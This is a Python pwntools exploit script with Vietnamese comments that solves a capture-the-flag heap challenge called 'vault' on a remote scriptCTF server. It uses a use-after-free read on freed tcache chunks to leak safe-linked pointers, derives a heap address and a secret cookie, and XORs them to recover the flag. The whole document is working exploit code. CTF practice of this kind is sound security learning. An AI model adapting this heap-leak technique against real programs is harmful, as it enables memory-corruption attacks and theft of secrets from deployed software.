from pwn import *

# Cấu hình
context.binary = elf = ELF('./vault')
# p = process()
p = remote('play.scriptsorcerers.xyz', 10369)

# ================== Helper functions ==================
def create(idx):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'index: ', str(idx).encode())

def read_from(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'index: ', str(idx).encode())
    p.recvuntil(b'ur stuff: ')
    return p.recv(8)

def free(idx):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'index: ', str(idx).encode())

# ================== Main Exploit Logic ==================

# Step 1: Lấy giá trị "lucky number" (flag ^ slab_cookie)
p.recvuntil(b'lucky number: 0x')
lucky_number_hex = p.recvline().strip()
lucky_number = int(lucky_number_hex, 16)
log.info(f"Lucky Number (flag ^ cookie): {hex(lucky_number)}")

# Step 2: Tạo 2 vault và free chúng để tạo chuỗi trong tcache
log.info("Creating vault 0 and 1...")
create(0)
create(1)

log.info("Freeing vault 0, then vault 1...")
free(0)
free(1) # Tcache bây giờ là: HEAD -> chunk 1 -> chunk 0 -> NULL

# Step 3: Leak hai giá trị từ hai vault đã được giải phóng
# Đọc từ vault 0 (trỏ tới chunk 0, mà next của nó là NULL)
log.info("Reading from vault 0...")
leak_A_bytes = read_from(0)
leak_A = u64(leak_A_bytes)
log.info(f"Leak A (S ^ (H0 >> 12)): {hex(leak_A)}")

# Đọc từ vault 1 (trỏ tới chunk 1, mà next của nó là chunk 0)
log.info("Reading from vault 1...")
leak_B_bytes = read_from(1)
leak_B = u64(leak_B_bytes)
log.info(f"Leak B (S ^ (H1 >> 12) ^ H0): {hex(leak_B)}")


# Step 4: Tính toán địa chỉ heap và cookie
# Giả định H1 >> 12 == H0 >> 12 vì chúng rất gần nhau
# addr_chunk_0 ≈ leak_A ^ leak_B
# Đây là một phép tính xấp xỉ, nhưng vì >> 12, sai số sẽ bị loại bỏ
addr_chunk_0_approx = leak_A ^ leak_B
log.info(f"Approximate addr_chunk_0: {hex(addr_chunk_0_approx)}")

# Làm tròn địa chỉ để loại bỏ nhiễu ở các bit thấp
# Các địa chỉ chunk heap thường được căn lề 0x10, nên 12 bit cuối thường là 0x...290, 0x...2a0 etc.
# Xóa 12 bit cuối (giống như >> 12) và sau đó nhân lại để có địa chỉ base của trang
page_base = addr_chunk_0_approx & 0xfffffffffffff000
# Thử các offset phổ biến
# Dựa trên debug local, offset thường là 0x290
addr_chunk_0 = page_base + 0x290
log.info(f"Guessed addr_chunk_0: {hex(addr_chunk_0)}")

# Tính lại slab_cookie từ phương trình 1
slab_cookie = leak_A ^ (addr_chunk_0 >> 12)
log.success(f"Calculated slab_cookie: {hex(slab_cookie)}")

# Step 5: Tính toán flag cuối cùng
flag = lucky_number ^ slab_cookie
log.success(f"!!! Calculated FLAG: {hex(flag)} !!!")

# In flag theo định dạng
print("\n" + "="*50)
print(f"Submit this: scriptCTF{{{hex(flag)}}}")
print("="*50)

p.close()